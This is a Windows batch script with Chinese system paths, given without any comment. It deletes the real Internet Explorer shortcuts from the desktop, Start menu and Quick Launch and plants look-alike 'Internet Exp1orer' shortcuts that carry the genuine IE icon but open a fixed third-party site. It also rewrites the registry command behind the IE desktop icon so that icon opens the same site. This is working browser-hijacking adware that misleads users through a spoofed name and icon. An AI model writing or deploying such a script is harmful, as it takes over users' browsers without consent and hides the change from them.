del "%userprofile%\桌面\IEXPLORE.lnk" /f/q/a
del "%userprofile%\桌面\IEXPLOREr.lnk" /f/q/a
del "%userprofile%\桌面\Internet Exporer.lnk" /f/q/a
del "%userprofile%\桌面\Internet Explorer.lnk" /f/q/a
del "%userprofile%\桌面\Internet Exp1orer.lnk" /f/q/a
del "%userprofile%\桌面\Internet Explorer.lnk"  /f/q/a
del "%userprofile%\桌面\Internet*.lnk"  /f/q/a
del "%userprofile%\桌面\*Internet*.lnk" /f/q/a
del "%userprofile%\桌面\Internet Exporer.url" /f/q/a
del "%userprofile%\桌面\Internet Explorer.url" /f/q/a
del "%userprofile%\桌面\Internet Exp1orer.url" /f/q/a
del "%userprofile%\桌面\Internet Explorer.url"  /f/q/a
 
del "%userprofile%\「开始」菜单\程序\Internet*.lnk"  /f/q/a
del "%userprofile%\「开始」菜单\程序\*Internet*.lnk" /f/q/a

del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Explorer.url" /f/q/a
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Explorer.lnk" /f/q/a
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\启动 Internet Explorer 浏览器.lnk" /f/q/a

del   "%userprofile%\「开始」菜单\Internet Explorer.url"   /f/q/a
del   "%userprofile%\「开始」菜单\Internet Explorer.lnk"  /f/q/a
del  "C:\Documents and Settings\All Users\「开始」菜单\Internet Explorer.url" /f/q/a
del  "C:\Documents and Settings\All Users\「开始」菜单\Internet Explorer.lnk" /f/q/a

@echo off
echo [InternetShortcut] >"%ALLUSERSPROFILE%\桌面\Internet Exp1orer.url"
echo URL=http://www.727dh.cn/?ksl1>>"%ALLUSERSPROFILE%\桌面\Internet Exp1orer.url"
::URL=%ProgramFiles%\Internet Explorer\iexplore.exe
echo IconIndex=0 >>"%ALLUSERSPROFILE%\桌面\Internet Exp1orer.url"
echo IconFile=%ProgramFiles%\Internet Explorer\iexplore.exe>>"%ALLUSERSPROFILE%\桌面\Internet Exp1orer.url"
::IconFile=%cd%\

@echo off
echo [InternetShortcut] >"%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Exp1orer.url"
echo URL=http://www.727dh.cn/?ksl1>>"%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Exp1orer.url"
::URL=%ProgramFiles%\Internet Explorer\iexplore.exe
echo IconIndex=0 >>"%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Exp1orer.url"
echo IconFile=%ProgramFiles%\Internet Explorer\iexplore.exe>>"%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Exp1orer.url"
::IconFile=%cd%\

@echo off
echo [InternetShortcut] >"%ALLUSERSPROFILE%\「开始」菜单\程序\Internet Exp1orer.url"
echo URL=http://www.727dh.cn/?ksl1>>"%ALLUSERSPROFILE%\「开始」菜单\程序\Internet Exp1orer.url"
::URL=%ProgramFiles%\Internet Explorer\iexplore.exe
echo IconIndex=0 >>"%ALLUSERSPROFILE%\「开始」菜单\程序\Internet Exp1orer.url"
echo IconFile=%ProgramFiles%\Internet Explorer\iexplore.exe>>"%ALLUSERSPROFILE%\「开始」菜单\程序\Internet Exp1orer.url"
::IconFile=%cd%\

@echo off
echo [InternetShortcut] >"%ALLUSERSPROFILE%\「开始」菜单\Internet Exp1orer.url"
echo URL=http://www.727dh.cn/?ksl1>>"%ALLUSERSPROFILE%\「开始」菜单\Internet Exp1orer.url"
::URL=%ProgramFiles%\Internet Explorer\iexplore.exe
echo IconIndex=0 >>"%ALLUSERSPROFILE%\「开始」菜单\Internet Exp1orer.url"
echo IconFile=%ProgramFiles%\Internet Explorer\iexplore.exe>>"%ALLUSERSPROFILE%\「开始」菜单\Internet Exp1orer.url"
::IconFile=%cd%\

@reg del "HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" /v  
@reg add "HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command" /v "" /d "%ProgramFiles%\Internet Explorer\iexplore.exe http://www.727dh.cn/?ksl1" /f

